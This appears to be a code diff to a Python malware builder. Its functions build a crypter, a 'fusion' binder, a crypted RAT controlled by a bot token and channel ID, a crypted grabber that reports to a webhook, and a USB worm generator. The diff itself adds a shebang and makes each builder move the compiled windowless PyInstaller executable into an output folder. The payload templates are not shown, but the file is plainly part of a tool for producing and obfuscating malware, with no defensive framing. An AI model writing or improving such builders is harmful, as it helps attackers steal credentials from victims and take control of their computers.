@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import sys
 import time
 import os
@@ -287,7 +290,14 @@ if __name__ == "__main__":
     temp_file.write_text(loader, encoding="utf-8")
     success = compile_pyinstaller(temp_file, output_name, None, console=False, onefile=True)
     temp_file.unlink()
-    return success
+    if success:
+        exe_path = Path("dist") / f"{output_name}.exe"
+        if exe_path.exists():
+            dest = BUILD_OUTPUT_DIR / f"{output_name}.exe"
+            shutil.move(str(exe_path), str(dest))
+            print(f"{Fore.GREEN}[+] EXE saved: {dest}{Style.RESET_ALL}")
+            return True
+    return False
 
 def build_crypter(exe_path, output_name):
     if not Path(exe_path).exists():
@@ -311,7 +321,14 @@ sys.exit()
     temp_file.write_text(loader, encoding="utf-8")
     success = compile_pyinstaller(temp_file, output_name, None, console=False, onefile=True)
     temp_file.unlink()
-    return success
+    if success:
+        exe_path = Path("dist") / f"{output_name}.exe"
+        if exe_path.exists():
+            dest = BUILD_OUTPUT_DIR / f"{output_name}.exe"
+            shutil.move(str(exe_path), str(dest))
+            print(f"{Fore.GREEN}[+] EXE saved: {dest}{Style.RESET_ALL}")
+            return True
+    return False
 
 def build_fusion(output_name, icon_path=None):
     grabber_template = STUB_DIR / "base_code.py"
@@ -359,7 +376,14 @@ if __name__ == "__main__":
     temp_file.write_text(fusion_code, encoding="utf-8")
     success = compile_pyinstaller(temp_file, output_name, icon_path, console=False, onefile=True)
     temp_file.unlink()
-    return success
+    if success:
+        exe_path = Path("dist") / f"{output_name}.exe"
+        if exe_path.exists():
+            dest = BUILD_OUTPUT_DIR / f"{output_name}.exe"
+            shutil.move(str(exe_path), str(dest))
+            print(f"{Fore.GREEN}[+] EXE saved: {dest}{Style.RESET_ALL}")
+            return True
+    return False
 
 def build_crypted_rat(token, channel_id, output_name, icon_path=None, console=False, onefile=True):
     template = STUB_DIR / "rat_template.py"
@@ -395,7 +419,14 @@ if __name__ == "__main__":
     temp.write_text(loader, encoding="utf-8")
     success = compile_pyinstaller(temp, output_name, icon_path, console, onefile)
     temp.unlink()
-    return success
+    if success:
+        exe_path = Path("dist") / f"{output_name}.exe"
+        if exe_path.exists():
+            dest = BUILD_OUTPUT_DIR / f"{output_name}.exe"
+            shutil.move(str(exe_path), str(dest))
+            print(f"{Fore.GREEN}[+] EXE saved: {dest}{Style.RESET_ALL}")
+            return True
+    return False
 
 def build_crypted_grabber(webhook, output_name, icon_path=None, console=False, onefile=True):
     template = STUB_DIR / "base_code.py"
@@ -430,7 +461,14 @@ if __name__ == "__main__":
     temp.write_text(loader, encoding="utf-8")
     success = compile_pyinstaller(temp, output_name, icon_path, console, onefile)
     temp.unlink()
-    return success
+    if success:
+        exe_path = Path("dist") / f"{output_name}.exe"
+        if exe_path.exists():
+            dest = BUILD_OUTPUT_DIR / f"{output_name}.exe"
+            shutil.move(str(exe_path), str(dest))
+            print(f"{Fore.GREEN}[+] EXE saved: {dest}{Style.RESET_ALL}")
+            return True
+    return False
 
 def build_usb_worm():
     print(f"{Fore.CYAN}[*] USB Worm Generator{Style.RESET_ALL}")
